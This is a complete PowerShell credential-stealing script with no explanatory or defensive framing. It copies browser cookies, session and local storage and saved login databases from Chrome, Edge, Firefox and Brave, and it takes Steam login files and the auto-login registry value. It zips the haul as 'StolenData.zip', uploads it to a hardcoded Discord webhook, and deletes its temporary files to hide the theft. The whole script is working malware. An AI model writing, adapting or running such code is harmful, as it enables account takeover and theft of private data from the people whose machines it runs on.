$webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"

$tempFolder = "$env:TEMP\BrowserData"
New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null

$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
)

$dataToGrab = @()

foreach ($path in $browserPaths) {
    if (Test-Path $path) {
        if (Test-Path "$path\Default\Cookies") { $dataToGrab += "$path\Default\Cookies" }
        if (Test-Path "$path\Default\Local Storage") { $dataToGrab += "$path\Default\Local Storage" }
        if (Test-Path "$path\Default\Session Storage") { $dataToGrab += "$path\Default\Session Storage" }
        if (Test-Path "$path\Default\Login Data") { $dataToGrab += "$path\Default\Login Data" }
    }
}

$steamPath = "$env:ProgramFiles(x86)\Steam"
if (Test-Path $steamPath) {
    if (Test-Path "$steamPath\config\loginusers.vdf") { $dataToGrab += "$steamPath\config\loginusers.vdf" }
    if (Test-Path "$steamPath\ssfn*") { $dataToGrab += (Get-Item "$steamPath\ssfn*").FullName }
    $registryToken = (Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -Name "AutoLoginUser" -ErrorAction SilentlyContinue).AutoLoginUser
    if ($registryToken) {
        $registryToken | Out-File -FilePath "$tempFolder\steam_token.txt"
        $dataToGrab += "$tempFolder\steam_token.txt"
    }
}

foreach ($file in $dataToGrab) {
    if (Test-Path $file) {
        $destination = Join-Path $tempFolder (Split-Path $file -Leaf)
        Copy-Item $file $destination -Force
    }
}

$zipFile = "$env:TEMP\StolenData.zip"
Compress-Archive -Path "$tempFolder\*" -DestinationPath $zipFile -Force

$boundary = [System.Guid]::NewGuid().ToString()
$fileBytes = [System.IO.File]::ReadAllBytes($zipFile)
$fileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)

$bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"StolenData.zip`"",
    "Content-Type: application/zip",
    "",
    $fileContent,
    "--$boundary--"
) -join "`r`n"

Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines

Remove-Item $tempFolder -Recurse -Force
Remove-Item $zipFile -Force
